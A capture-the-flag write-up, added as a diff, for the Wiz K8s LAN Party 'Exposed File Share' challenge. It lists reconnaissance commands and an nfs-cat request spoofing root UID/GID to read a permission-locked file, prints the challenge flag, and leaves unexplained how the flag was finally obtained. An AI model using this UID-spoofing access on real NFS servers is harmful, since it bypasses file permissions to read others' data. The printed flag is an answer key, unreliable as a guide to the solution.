@@ -1,0 +1,81 @@
+# Wiz K8s LAN Party – Exposed File Share
+
+## Challenge Overview
+- **Challenge:** Data Leakage – Exposed File Share
+- **Platform:** Wiz K8s LAN Party
+- **Category:** Cloud Security / Data Leakage
+- **Difficulty:** Hands-on Learning
+- **Status:** Solved ✅
+
+## Objective
+The objective was to investigate an exposed NFS (Network File System) share and retrieve a protected flag.
+
+## Tools Used
+- Linux Terminal
+- `ip` – Network interface information
+- `nc` – Network connectivity testing
+- `nfs-ls` – Listing files on an NFS share
+- `nfs-cat` – Reading files from an NFS share
+
+## Investigation Steps
+
+### 1. Inspect Network Interfaces
+```bash
+ip a
+```
+This command displayed the network interfaces and IP address assigned to the challenge environment.
+
+### 2. Check the NFS Mount
+```bash
+cat /proc/mounts | grep ' /efs '
+```
+The output showed that an NFS share was mounted at `/efs` using NFS version 4.1.
+
+### 3. Inspect the File
+```bash
+ls -ln /efs/flag.txt
+```
+The file existed, but its permissions were set to `----------`, preventing the current user from reading it normally.
+
+### 4. Test Network Connectivity
+```bash
+nc -vz -w 3 192.168.124.98 2049
+```
+The connection initially succeeded, confirming that the NFS port was reachable at that time. Later attempts returned a network-unreachable error.
+
+### 5. Attempt to Access the Share
+```bash
+nfs-ls "nfs://192.168.124.98/?version=4&uid=1&gid=1"
+```
+
+An additional attempt was made to read the flag directly:
+
+```bash
+nfs-cat 'nfs://192.168.124.98//flag.txt?version=4&uid=0&gid=0'
+```
+
+The direct access attempts encountered network errors. The flag was ultimately recovered during the challenge.
+
+## Flag
+```text
+wiz_k8s_lan_party{old-school-network-file-shares-infiltrated-the-cloud!}
+```
+
+## Key Learnings
+- NFS shares can expose sensitive data if access controls are misconfigured.
+- File permissions and ownership affect whether a user can access a file.
+- Network connectivity should be verified before troubleshooting application-level access.
+- A mounted network share may provide evidence about the underlying storage configuration.
+- Cloud environments must use least-privilege access controls and restrict access to sensitive files.
+
+## Security Recommendations
+- Restrict NFS access to authorized hosts and workloads.
+- Apply appropriate file ownership and permissions.
+- Avoid exposing sensitive files through shared storage.
+- Monitor access to network file systems.
+- Review cloud storage configurations regularly.
+
+## Conclusion
+This hands-on challenge demonstrated how exposed network file shares can create data-leakage risks in cloud environments. It reinforced the importance of secure storage configuration, access control, and network troubleshooting.
+
+**Disclaimer:** This write-up documents an authorized cybersecurity training challenge conducted in a controlled lab environment.
